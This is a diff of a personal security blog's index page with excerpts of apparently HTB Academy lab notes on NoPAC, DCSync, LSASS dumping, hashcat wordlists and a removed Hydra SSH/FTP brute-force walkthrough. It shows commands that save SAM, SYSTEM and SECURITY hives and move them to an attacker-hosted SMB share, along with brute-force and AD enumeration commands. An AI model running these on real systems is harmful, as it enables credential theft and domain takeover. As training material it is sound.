@@ -133,11 +133,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2025/06/19/HTB Skill Assessment II Walkthrough/" >HTB Academy - Login Brute Forcing Skill Assessment II  Walkthrough</a>
+			<a href="/2025/07/08/No-pac/" >The NoPAC Attack</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2025-06-19  </div>
+		<div class="date">post @ 2025-07-08  </div>
 		</div>
 	</div>
 	
@@ -147,18 +147,225 @@
   <div class="row">
 	
 	
-		<h2 id><a href="#" class="headerlink" title></a><img src="https://academy.hackthebox.com/storage/modules/57/logo.png" alt="htblogo"></h2><p> The assessment’s objective is to  brute force  both SSH &amp; FTP servers on the target.<br> we start by gathering the  username for the SSH server   from skill Assessment I’s solution, which I’m not allowed to spoil.<br>lets start by brute forcing that user’s SSH password:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;2023-200_most_used_passwords.txt&gt; &lt;ip&gt; -s &lt;port&gt; ssh -t 3 -I</span><br></pre></td></tr></table></figure>
-<p>SSH into target</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh &lt;user&gt;@83.136.253.201 -p &lt;port&gt;</span><br><span class="line">#prompt for pass:&lt;pass&gt;</span><br></pre></td></tr></table></figure>
-<p>open incident report, There should be  a username hint<br><img src="/../images/bruting/namehint.png" alt="namehint"><br> use <code>username-anarchy</code> tool on the discovered user to generate a  list of possible ftp username combinations:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./username-anarchy/username-anarchy [FIRST] [LAST] &gt; tsmithNames.txt</span><br></pre></td></tr></table></figure>
-<p>brute ftp with the newly generated username list and the provided password list on the target.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L &lt;unarchyLIST.txt&gt;.txt -P passwords.txt 127.0.0.1 ftp -t 3 -I</span><br></pre></td></tr></table></figure>
-<p><img src="/../images/bruting/ftphydra.png" alt="ftphydra"><br>login to ftp</p>
+		<p><img src="/images/NOPACK.png" alt="alt text"></p>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins</p>
+<h2 id="The-Inside-Out"><a href="#The-Inside-Out" class="headerlink" title="The Inside Out"></a>The Inside Out</h2><p>This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>42278</td>
+<td>42278 is a bypass vulnerability with the Security Account Manager (SAM).</td>
+</tr>
+<tr>
+<td>42287</td>
+<td>42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.</td>
+</tr>
+</tbody></table>
+<p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain.</p>
+<p>When doing so, we change the name of the new host to match a Domain Controller’s SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC’s name instead of the new name. </p>
+<p>When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.</p>
+<p>In November 9, 2021: Microsoft released initial security updates that addressed both CVE‑2021‑42278 (SAM spoofing) and CVE‑2021‑42287 (Kerberos PAC bypass)<br><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5011266">support.microsoft.com+15</a></p>
 	
 	</div>
-  <a type="button" href="/2025/06/19/HTB Skill Assessment II Walkthrough/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2025/07/08/No-pac/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2025/07/08/Dumpin Registery Hives/" >Dumping  SAM, SYSTEM, and SECURITY hives</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2025-07-08  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><img src="/../images/secd1.png" alt="alt text"></p>
+<h1 id="cheatsheet"><a href="#cheatsheet" class="headerlink" title="cheatsheet"></a>cheatsheet</h1><p>  <code>reg.exe</code> to save copies of the registry hives:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<p> copy to VM:</p>
+<ul>
+<li>create a smb share on attacking vm</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbserver -smb2support compdata /home/demise/mountshare</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>move hives to share:</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">move</span> <span class="title">sam.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">security.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">       </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">system.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">     </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">sam.save  security.save  system.save</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2025/07/08/Dumpin Registery Hives/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2025/07/08/Attacking lsass/" >Attacking Windows LSASS</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2025-07-08  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><img src="/../images/mimikatz1.png" alt="alt text"></p>
+<hr>
+<h1 id="Overview-on-LSASS"><a href="#Overview-on-LSASS" class="headerlink" title="Overview on LSASS"></a>Overview on LSASS</h1><p>In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a>.</p>
+<p>Upon initial logon, LSASS will:</p>
+<ul>
+<li>Cache credentials locally in memory</li>
+<li>Create <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a></li>
+<li>Enforce security policies</li>
+<li>Write to Windows’ <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security">security log</a><br>Let’s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.</li>
+</ul>
+<h2 id="Securable-Objects"><a href="#Securable-Objects" class="headerlink" title="Securable Objects"></a>Securable Objects</h2><p>In Windows, <strong>securable objects</strong> are resources that the operating system protects through <strong>Access Control Lists (ACLs)</strong> and other security mechanisms. These objects can have permissions assigned to users or groups, allowing or denying access.</p>
+<h2 id="LSASS-Process-Memory-dump"><a href="#LSASS-Process-Memory-dump" class="headerlink" title="LSASS Process Memory dump"></a>LSASS Process Memory dump</h2><p>Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. K</p>
+	
+	</div>
+  <a type="button" href="/2025/07/08/Attacking lsass/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2025/06/20/HTB-Writing custom wordlists using hashcat and cuppy/" >Writing custom wordlists using hashcat and cuppy</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2025-06-20  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><img src="/../images/hashcat1.png" alt="alt text"></p>
+<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>this section highlights the power of custom wordlists,<br>Instead of relying on generic, multi-gigabyte wordlists, we will perform a <strong>targeted attack</strong>.</p>
+<p>This highly effective strategy uses Open Source Intelligence (OSINT) to create a custom wordlist and ruleset tailored specifically to our victim.</p>
+<p>We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists.</p>
+<p>Hashcat uses a specific syntax to define characters, words, and their transformations. The complete syntax is documented in the official <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Hashcat rule-based attack documentation</a>, but the examples below are sufficient to understand how Hashcat mutates input words.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>:</code></td>
+<td>Do nothing</td>
+</tr>
+<tr>
+<td><code>l</code></td>
+<td>Lowercase all letters</td>
+</tr>
+<tr>
+<td><code>u</code></td>
+<td>Uppercase all letters</td>
+</tr>
+<tr>
+<td><code>c</code></td>
+<td>Capitalize the first letter and lowercase others</td>
+</tr>
+<tr>
+<td><code>sXY</code> (leet)</td>
+<td>Replace all instances of X with Y</td>
+</tr>
+<tr>
+<td><code>$!</code></td>
+<td>Add the exclamation character at the end</td>
+</tr>
+<tr>
+<td>$0, $9</td>
+<td>appends numbers</td>
+</tr>
+<tr>
+<td>$1$9$9$8</td>
+<td>translates to 1998</td>
+</tr>
+<tr>
+<td><code>t</code></td>
+<td>Toggle the case of all characters in word p@ssW0rd-&gt;P@SSw0RD</td>
+</tr>
+</tbody></table>
+<p>Each rule is written on a new line and determines how a given word should be transformed. If we write the functions shown above into a file, it may look like this:</p>
+<p>We can use the following command to apply the rules in <code>custom.rule</code> to each word in <code>password.list</code> and store the mutated results in <code>mut_password.list</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2025/06/20/HTB-Writing custom wordlists using hashcat and cuppy/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2025/03/26/dcsync/" >On  Performing a DCSync Attack</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2025-03-26  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><img src="/../images/dcysnc23.png" alt="alt text"><br>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>
+<p>The core of the attack involves exploiting the DS-Replication-Get-Changes-All extended right to prompt a Domain Controller to replicate password data. This specific Active Directory permission grants access to replicate sensitive, secret information across the domain.<br><img src="/../images/REPACE.png" alt="alt text"></p>
+<h3 id="Account-Enumeration"><a href="#Account-Enumeration" class="headerlink" title="Account Enumeration"></a>Account Enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Checking-user-Groups-SID-ACLs"><a href="#Checking-user-Groups-SID-ACLs" class="headerlink" title="Checking user Groups, SID, ACLs"></a>Checking user Groups, SID, ACLs</h3><p>PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.</p>
+<p>We first get the user’s SID in the above command and then check all ACLs set on the domain object (<code>&quot;DC=inlanefreight,DC=local&quot;</code>) using <a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/">Get-ObjectAcl</a> to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user <code>adunn</code> (denoted in the below command as <code>$sid</code>) possesses these rights. The command confirms that the user does indeed have the rights.<br>Checking for Replication–Get ACE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sid = &quot;&#123;sid-here&#125;&quot;</span><br><span class="line"></span><br><span class="line">PS&gt; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#x27;Replication-Get&#x27;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN</span><br></pre></td></tr></table></figure>
+<p>If we had certain rights over the user (such as <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let’s see a few quick examples.</p>
+<h3 id="exploit-replication-ACE-to-perform-DCsync"><a href="#exploit-replication-ACE-to-perform-DCsync" class="headerlink" title="exploit  replication ACE to perform DCsync"></a>exploit  replication ACE to perform DCsync</h3>
+	
+	</div>
+  <a type="button" href="/2025/03/26/dcsync/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -259,36 +466,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/windows/">windows<span>2</span></a></li>
-		
-			<li><a href="/tags/smb/">smb<span>2</span></a></li>
-		
-			<li><a href="/tags/privilege-escalation/">privilege escalation<span>2</span></a></li>
-		
-			<li><a href="/tags/chisel/">chisel<span>2</span></a></li>
-		
-			<li><a href="/tags/nmap/">nmap<span>3</span></a></li>
-		
-			<li><a href="/tags/brute/">brute<span>1</span></a></li>
+			<li><a href="/tags/windows/">windows<span>3</span></a></li>
 		
 			<li><a href="/tags/password-spray/">password-spray<span>2</span></a></li>
 		
-			<li><a href="/tags/hydra/">hydra<span>1</span></a></li>
-		
-			<li><a href="/tags/openfire/">openfire<span>2</span></a></li>
-		
-			<li><a href="/tags/Writeup/">Writeup<span>3</span></a></li>
-		
 			<li><a href="/tags/HTB/">HTB<span>2</span></a></li>
-		
-			<li><a href="/tags/bruteforcing/">bruteforcing<span>1</span></a></li>
-		
-			<li><a href="/tags/htb-solarlab/">htb solarlab<span>1</span></a></li>
-		
-			<li><a href="/tags/flask/">flask<span>2</span></a></li>
 		
 			<li><a href="/tags/htb-Cicada/">htb Cicada<span>1</span></a></li>
 		
+			<li><a href="/tags/openfire/">openfire<span>2</span></a></li>
+		
+			<li><a href="/tags/smb/">smb<span>2</span></a></li>
+		
+			<li><a href="/tags/htb-solarlab/">htb solarlab<span>1</span></a></li>
+		
+			<li><a href="/tags/AD/">AD<span>2</span></a></li>
+		
+			<li><a href="/tags/nopac/">nopac<span>1</span></a></li>
+		
+			<li><a href="/tags/secretsdump/">secretsdump<span>1</span></a></li>
+		
+			<li><a href="/tags/chisel/">chisel<span>2</span></a></li>
+		
+			<li><a href="/tags/nmap/">nmap<span>2</span></a></li>
+		
+			<li><a href="/tags/dcsync/">dcsync<span>1</span></a></li>
+		
+			<li><a href="/tags/cupp/">cupp<span>1</span></a></li>
+		
+			<li><a href="/tags/Active-Directory/">Active Directory<span>2</span></a></li>
+		
+			<li><a href="/tags/mimikatz/">mimikatz<span>2</span></a></li>
+		
+			<li><a href="/tags/Writeup/">Writeup<span>2</span></a></li>
+		
+			<li><a href="/tags/privilege-escalation/">privilege escalation<span>2</span></a></li>
+		
+			<li><a href="/tags/privEsc/">privEsc<span>1</span></a></li>
+		
+			<li><a href="/tags/Lateral-Movement/">Lateral Movement<span>2</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>25</span></a></li>
 		 
 		</ul>
 	</div>
@@ -301,15 +520,23 @@
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2025/06/19/HTB Skill Assessment II Walkthrough/" ><i class="fa fa-file-o"></i>HTB Academy - Login Brute F...</a>
+        <a href="/2025/07/08/No-pac/" ><i class="fa fa-file-o"></i>The NoPAC Attack</a>
       </li>
     
       <li>
-        <a href="/2025/01/22/HTB-Cicada/" ><i class="fa fa-file-o"></i>HackTheBox Cicada  Walkthro...</a>
+        <a href="/2025/07/08/Dumpin Registery Hives/" ><i class="fa fa-file-o"></i>Dumping  SAM, SYSTEM, and S...</a>
       </li>
     
       <li>
-        <a href="/2024/09/22/HTB-SolarLab/" ><i class="fa fa-file-o"></i>HackTheBox SolarLab  Walkth...</a>
+        <a href="/2025/07/08/Attacking lsass/" ><i class="fa fa-file-o"></i>Attacking Windows LSASS</a>
+      </li>
+    
+      <li>
+        <a href="/2025/06/20/HTB-Writing custom wordlists using hashcat and cuppy/" ><i class="fa fa-file-o"></i>Writing custom wordlists us...</a>
+      </li>
+    
+      <li>
+        <a href="/2025/03/26/dcsync/" ><i class="fa fa-file-o"></i>On  Performing a DCSync Att...</a>
       </li>
     
   </ul>
